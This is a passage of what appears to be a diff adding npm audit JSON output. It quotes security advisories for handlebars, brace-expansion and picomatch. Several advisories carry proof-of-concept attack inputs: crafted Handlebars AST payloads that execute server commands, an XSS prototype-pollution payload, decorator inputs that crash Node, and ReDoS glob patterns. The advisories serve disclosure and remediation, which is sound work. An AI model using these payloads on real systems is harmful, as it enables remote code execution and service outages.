+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2w6w-674q-4c4q\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33937\n- https://github.com/advisories/GHSA-2w6w-674q-4c4q",
+      "created": "2026-03-27T18:19:58.000Z",
+      "id": 1115539,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`Handlebars.compile()` accepts a pre-parsed AST object in addition to a template string. The `value` field of a `NumberLiteral` AST node is emitted directly into the generated JavaScript without quoting or sanitization. An attacker who can supply a crafted AST to `compile()` can therefore inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`Handlebars.compile()` accepts either a template string or a pre-parsed AST. When an AST is supplied, the JavaScript code generator in `lib/handlebars/compiler/javascript-compiler.js` emits `NumberLiteral` values verbatim:\n\n```javascript\n// Simplified representation of the vulnerable code path:\n// NumberLiteral.value is appended to the generated code without escaping\ncompiledCode += numberLiteralNode.value;\n```\n\nBecause the value is not wrapped in quotes or otherwise sanitized, passing a string such as `{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //` as the `value` of a `NumberLiteral` causes the generated `eval`-ed code to break out of its intended context and execute arbitrary commands.\n\nAny endpoint that deserializes user-controlled JSON and passes the result directly to `Handlebars.compile()` is exploitable.\n\n## Proof of Concept\n\nServer-side Express application that passes `req.body.text` to `Handlebars.compile()`:\n\n\n```Javascript\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  let text = req.body.text;\n  let template = Handlebars.compile(text);\n  let result = template();\n  res.send(result);\n});\n\napp.listen(2123);\n```\n\n```\nPOST /api/render HTTP/1.1\nContent-Type: application/json\nHost: 127.0.0.1:2123\n\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"body\": [\n      {\n        \"type\": \"MustacheStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\",\n          \"data\": false,\n          \"depth\": 0,\n          \"parts\": [\"lookup\"],\n          \"original\": \"lookup\",\n          \"loc\": null\n        },\n        \"params\": [\n          {\n            \"type\": \"PathExpression\",\n            \"data\": false,\n            \"depth\": 0,\n            \"parts\": [],\n            \"original\": \"this\",\n            \"loc\": null\n          },\n          {\n            \"type\": \"NumberLiteral\",\n            \"value\": \"{},{})) + process.getBuiltinModule('child_process').execFileSync('id').toString() //\",\n            \"original\": 1,\n            \"loc\": null\n          }\n        ],\n        \"escaped\": true,\n        \"strip\": { \"open\": false, \"close\": false },\n        \"loc\": null\n      }\n    ]\n  }\n}\n```\n\nThe response body will contain the output of the `id` command executed on the server.\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33937"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-2w6w-674q-4c4q",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:19.000Z",
+      "cvss": {
+        "score": 9.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-2w6w-674q-4c4q"
+    },
+    "1115540": {
+      "findings": [
+        {
+          "version": "1.1.12",
+          "paths": [
+            ".>jest>@jest/core>@jest/reporters>glob>minimatch>brace-expansion"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n- https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n- https://github.com/juliangruber/brace-expansion/issues/98\n- https://github.com/juliangruber/brace-expansion/pull/95\n- https://github.com/juliangruber/brace-expansion/pull/96\n- https://github.com/juliangruber/brace-expansion/pull/97\n- https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5\n- https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2\n- https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33750\n- https://github.com/advisories/GHSA-f886-m6hf-6m8v",
+      "created": "2026-03-26T18:29:42.000Z",
+      "id": 1115540,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.\n\nThe loop in question:\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184\n\n`test()` is one of\n\nhttps://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113\n\nThe increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.\n\nThis affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.\n\n### Patches\n\n\nUpgrade to versions\n- 5.0.5+\n\nA step increment of 0 is now sanitized to 1, which matches bash behavior.\n\n### Workarounds\n\nSanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+      "reported_by": null,
+      "title": "brace-expansion: Zero-step sequence causes process hang and memory exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33750"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "brace-expansion",
+      "vulnerable_versions": "<1.1.13",
+      "github_advisory_id": "GHSA-f886-m6hf-6m8v",
+      "recommendation": "Upgrade to version 1.1.13 or later",
+      "patched_versions": ">=1.1.13",
+      "updated": "2026-03-27T21:38:55.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400"
+      ],
+      "url": "https://github.com/advisories/GHSA-f886-m6hf-6m8v"
+    },
+    "1115544": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-2qvq-rjwj-gvw9\n- https://nvd.nist.gov/vuln/detail/CVE-2021-23369\n- https://nvd.nist.gov/vuln/detail/CVE-2021-23383\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33916\n- https://github.com/advisories/GHSA-2qvq-rjwj-gvw9",
+      "created": "2026-03-26T22:20:51.000Z",
+      "id": 1115544,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`resolvePartial()` in the Handlebars runtime resolves partial names via a plain property lookup on `options.partials` without guarding against prototype-chain traversal. When `Object.prototype` has been polluted with a string value whose key matches a partial reference in a template, the polluted string is used as the partial body and rendered **without HTML escaping**, resulting in reflected or stored XSS.\n\n## Description\n\nThe root cause is in `lib/handlebars/runtime.js` inside `resolvePartial()` and `invokePartial()`:\n\n```javascript\n// Vulnerable: plain bracket access traverses Object.prototype\npartial = options.partials[options.name];\n```\n\n`hasOwnProperty` is never checked, so if `Object.prototype` has been seeded with a key whose name matches a partial reference in the template (e.g. `widget`), the lookup succeeds and the polluted string is returned. The runtime emits a prototype-access warning, but the partial is still resolved and its content is inserted into the rendered output unescaped. This contradicts the documented security model and is distinct from CVE-2021-23369 and CVE-2021-23383, which addressed data property access rather than partial template resolution.\n\n**Prerequisites for exploitation:**\n1. The target application must be vulnerable to prototype pollution (e.g. via `qs`, `minimist`, or\n   any querystring/JSON merge sink).\n2. The attacker must know or guess the name of a partial reference used in a template.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// Step 1: Prototype pollution (via qs, minimist, or another vector)\nObject.prototype.widget = '<img src=x onerror=\"alert(document.domain)\">';\n\n// Step 2: Normal template that references a partial\nconst template = Handlebars.compile('<div>Welcome! {{> widget}}</div>');\n\n// Step 3: Render — XSS payload injected unescaped\nconst output = template({});\n// Output: <div>Welcome! <img src=x onerror=\"alert(document.domain)\"></div>\n```\n\n> The runtime prints a prototype access warning claiming \"access has been denied,\" but the partial still resolves and returns the polluted value.\n\n## Workarounds\n\n- Apply `Object.freeze(Object.prototype)` early in application startup to prevent prototype  pollution. Note: this may break other libraries.\n- Use the Handlebars runtime-only build (`handlebars/runtime`), which does not compile templates  and reduces the attack surface.",
+      "reported_by": null,
+      "title": "Handlebars.js has Prototype Pollution Leading to XSS through Partial Template Injection",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33916"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <4.7.9",
+      "github_advisory_id": "GHSA-2qvq-rjwj-gvw9",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-27T21:52:04.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-2qvq-rjwj-gvw9"
+    },
+    "1115549": {
+      "findings": [
+        {
+          "version": "2.3.1",
+          "paths": [
+            ".>@types/jest>expect>jest-message-util>micromatch>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115549,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33672"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": "<2.3.2",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 2.3.2 or later",
+      "patched_versions": ">=2.3.2",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115552": {
+      "findings": [
+        {
+          "version": "2.3.1",
+          "paths": [
+            ".>@types/jest>expect>jest-message-util>micromatch>picomatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115552,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33671"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": "<2.3.2",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 2.3.2 or later",
+      "patched_versions": ">=2.3.2",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1115588": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-7rx3-28cr-v5wh\n- https://github.com/advisories/GHSA-765h-qjxv-5f44\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://github.com/advisories/GHSA-7rx3-28cr-v5wh",
+      "created": "2026-03-29T15:17:15.000Z",
+      "id": 1115588,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe prototype method blocklist in `lib/handlebars/internal/proto-access.js` blocks `constructor`, `__defineGetter__`, `__defineSetter__`, and `__lookupGetter__`, but omits the symmetric `__lookupSetter__`. This omission is only exploitable when the non-default runtime option `allowProtoMethodsByDefault: true` is explicitly set — in that configuration `__lookupSetter__` becomes accessible while its counterparts remain blocked, creating an inconsistent security boundary.\n\n`4.6.0` is the version that introduced `protoAccessControl` and the `allowProtoMethodsByDefault` runtime option.\n\n## Description\n\nIn `lib/handlebars/internal/proto-access.js`:\n\n```javascript\nconst methodWhiteList = Object.create(null);\nmethodWhiteList['constructor']      = false;\nmethodWhiteList['__defineGetter__'] = false;\nmethodWhiteList['__defineSetter__'] = false;\nmethodWhiteList['__lookupGetter__'] = false;\n// __lookupSetter__ intentionally blocked in CVE-2021-23383,\n// but omitted here — creating an asymmetric blocklist\n```\n\nAll four legacy accessor helpers (`__defineGetter__`, `__defineSetter__`, `__lookupGetter__`, `__lookupSetter__`) were involved in the exploit chain addressed by CVE-2021-23383. Three of the four were explicitly blocked; `__lookupSetter__` was left out.\n\nWhen `allowProtoMethodsByDefault: true` is set, any prototype method **not present** in `methodWhiteList` is permitted by default. Because `__lookupSetter__` is absent from the list, it passes the `checkWhiteList` check and is accessible in templates, while `__lookupGetter__` (its sibling) is correctly denied.\n\n## Workarounds\n\n- Do **not** set `allowProtoMethodsByDefault: true`. The default configuration is not affected.\n- If `allowProtoMethodsByDefault` must be enabled, ensure templates do not reference  `__lookupSetter__` through untrusted input.",
+      "reported_by": null,
+      "title": "Handlebars.js has a Prototype Method Access Control Gap via Missing __lookupSetter__ Blocklist Entry",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.6.0 <=4.7.8",
+      "github_advisory_id": "GHSA-7rx3-28cr-v5wh",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-29T15:17:16.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-7rx3-28cr-v5wh"
+    },
+    "1115589": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-442j-39wm-28r2\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://github.com/advisories/GHSA-442j-39wm-28r2",
+      "created": "2026-03-29T15:16:37.000Z",
+      "id": 1115589,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nIn `lib/handlebars/runtime.js`, the `container.lookup()` function uses `container.lookupProperty()` as a gate check to enforce prototype-access controls, but then discards the validated result and performs a second, unguarded property access (`depths[i][name]`). This Time-of-Check Time-of-Use (TOCTOU) pattern means the security check and the actual read are decoupled, and the raw access bypasses any sanitization that `lookupProperty` may perform.\n\nOnly relevant when the **compat** compile option is enabled (`{compat: true}`), which activates `depthedLookup` in `lib/handlebars/compiler/javascript-compiler.js`.\n\n## Description\n\nThe vulnerable code in `lib/handlebars/runtime.js` (lines 137–144):\n\n```javascript\nlookup: function (depths, name) {\n  const len = depths.length;\n  for (let i = 0; i < len; i++) {\n    let result = depths[i] && container.lookupProperty(depths[i], name);\n    if (result != null) {\n      return depths[i][name];  // BUG: should be `return result;`\n    }\n  }\n},\n```\n\n`container.lookupProperty()` (lines 119–136) enforces `hasOwnProperty` checks and `resultIsAllowed()` prototype-access controls. However, `container.lookup()` only uses `lookupProperty` as a boolean gate — if the gate passes (`result != null`), it then performs an independent, raw `depths[i][name]` access that circumvents any transformation or wrapped value that `lookupProperty` may have returned.\n\n## Workarounds\n\n- Avoid enabling `{ compat: true }` when rendering templates that include untrusted data.\n- Ensure context data objects are plain JSON (no Proxies, no getter-based accessor properties).",
+      "reported_by": null,
+      "title": "Handlebars.js has a Property Access Validation Bypass in container.lookup",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-442j-39wm-28r2",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-29T15:16:37.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-367"
+      ],
+      "url": "https://github.com/advisories/GHSA-442j-39wm-28r2"
+    },
+    "1115693": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xhpv-hc6g-r9c6\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33940\n- https://github.com/advisories/GHSA-xhpv-hc6g-r9c6",
+      "created": "2026-03-27T18:21:44.000Z",
+      "id": 1115693,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA crafted object placed in the template context can bypass all conditional guards in `resolvePartial()` and cause `invokePartial()` to return `undefined`. The Handlebars runtime then treats the unresolved partial as a source that needs to be compiled, passing the crafted object to `env.compile()`. Because the object is a valid Handlebars AST containing injected code, the generated JavaScript executes arbitrary commands on the server. The attack requires the adversary to control a value that can be returned by a dynamic partial lookup.\n\n## Description\n\nThe vulnerable code path spans two functions in `lib/handlebars/runtime.js`:\n\n**`resolvePartial()`:** A crafted object with `call: true` satisfies the first branch condition (`partial.call`) and causes an early return of the original object itself, because none of the remaining conditionals (string check, `options.partials` lookup, etc.) match a plain object. The function returns the crafted object as-is.\n\n**`invokePartial()`:** When `resolvePartial` returns a non-function object, `invokePartial` produces `undefined`. The runtime interprets `undefined` as \"partial not yet compiled\" and calls `env.compile(partial, ...)` where `partial` is the crafted AST object. The JavaScript code generator processes the AST and emits JavaScript containing the injected payload, which is then evaluated.\n\n**Minimum prerequisites:**\n1. The template uses a dynamic partial lookup: `{{> (lookup . \"key\")}}` or equivalent.\n2. The adversary can set the value of the looked-up context property to a crafted object.\n\nIn server-side rendering scenarios where templates process user-supplied context data, this enables full Remote Code Execution.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\nconst vulnerableTemplate = `{{> (lookup . \"payload\")}}`;\n\nconst maliciousContext = {\n  payload: {\n    call: true, // bypasses the primary resolvePartial branch\n    type: \"Program\",\n    body: [\n      {\n        type: \"MustacheStatement\",\n        depth: 0,\n        path: {\n          type: \"PathExpression\",\n          parts: [\"pop\"],\n          original: \"this.pop\",\n          // Injected code breaks out of the generated function's argument list\n          depth: \"0])),function () {console.error('VULNERABLE: object -> dynamic partial -> RCE');}()));//\",\n        },\n      },\n    ],\n  },\n};\n\nHandlebars.compile(vulnerableTemplate)(maliciousContext);\n// Prints: VULNERABLE: object -> dynamic partial -> RCE\n```\n\n## Workarounds\n\n- **Use the runtime-only build** (`require('handlebars/runtime')`). Without `compile()`,  the fallback compilation path in `invokePartial` is unreachable.\n- **Sanitize context data** before rendering: ensure no value in the context is a non-primitive  object that could be passed to a dynamic partial.\n- **Avoid dynamic partial lookups** (`{{> (lookup ...)}}`) when context data is user-controlled.",
+      "reported_by": null,
+      "title": "Handlebars.js has JavaScript Injection via AST Type Confusion when passing an object as dynamic partial",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33940"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-xhpv-hc6g-r9c6",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:34.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-xhpv-hc6g-r9c6"
+    },
+    "1115694": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-9cx6-37pm-9jff\n- https://github.com/handlebars-lang/handlebars.js/commit/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2\n- https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33939\n- https://github.com/advisories/GHSA-9cx6-37pm-9jff",
+      "created": "2026-03-27T18:21:15.000Z",
+      "id": 1115694,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen a Handlebars template contains decorator syntax referencing an unregistered decorator (e.g. `{{*n}}`), the compiled template calls `lookupProperty(decorators, \"n\")`, which returns `undefined`. The runtime then immediately invokes the result as a function, causing an unhandled `TypeError: ... is not a function` that crashes the Node.js process. Any application that compiles user-supplied templates without wrapping the call in a `try/catch` is vulnerable to a single-request Denial of Service.\n\n## Description\n\nIn `lib/handlebars/compiler/javascript-compiler.js`, the code generated for a decorator invocation looks like:\n\n```javascript\nfn = lookupProperty(decorators, \"n\")(fn, props, container, options) || fn;\n```\n\nWhen `\"n\"` is not a registered decorator, `lookupProperty(decorators, \"n\")` returns `undefined`. The expression immediately attempts to call `undefined` as a function, producing:\n\n```\nTypeError: lookupProperty(...) is not a function\n```\n\nBecause the error is thrown inside the compiled template function and is not caught by the runtime, it propagates up as an unhandled exception and — when not caught by the application — crashes the Node.js process.\n\nThis inconsistency is notable: references to unregistered **helpers** produce a clean `\"Missing helper: ...\"` error, while references to unregistered **decorators** cause a hard crash.\n\n**Attack scenario:** An attacker submits `{{*n}}` as template content to any endpoint that calls `Handlebars.compile(userInput)()`. Each request crashes the server process; with process managers that auto-restart (PM2, systemd), repeated submissions create a persistent DoS.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars'); // Handlebars 4.7.8, Node.js v22.x\n\n// Any of these payloads crash the process\nHandlebars.compile('{{*n}}')({});\nHandlebars.compile('{{*decorator}}')({});\nHandlebars.compile('{{*constructor}}')({});\n```\n\nExpected crash output:\n```\nTypeError: lookupProperty(...) is not a function\n    at Function.eval [as decorator] (eval at compile (...javascript-compiler.js:134:36))\n```\n\n## Workarounds\n\n- **Wrap compilation and rendering in `try/catch`:**\n  ```javascript\n  try {\n    const result = Handlebars.compile(userInput)(context);\n    res.send(result);\n  } catch (err) {\n    res.status(400).send('Invalid template');\n  }\n  ```\n- **Validate template input** before passing it to `compile()`. Reject templates containing  decorator syntax (`{{*...}}`) if decorators are not used in your application.\n- **Use the pre-compilation workflow:** compile templates at build time and serve only pre-compiled  templates; do not call `compile()` at request time.",
+      "reported_by": null,
+      "title": "Handlebars.js has Denial of Service via Malformed Decorator Syntax in Template Compilation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33939"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "handlebars",
+      "vulnerable_versions": ">=4.0.0 <=4.7.8",
+      "github_advisory_id": "GHSA-9cx6-37pm-9jff",
+      "recommendation": "Upgrade to version 4.7.9 or later",
+      "patched_versions": ">=4.7.9",
+      "updated": "2026-03-30T20:08:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-754"
+      ],
+      "url": "https://github.com/advisories/GHSA-9cx6-37pm-9jff"
+    },
+    "1117465": {
+      "findings": [
+        {
+          "version": "4.7.8",
+          "paths": [
+            ".>ts-jest>handlebars"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
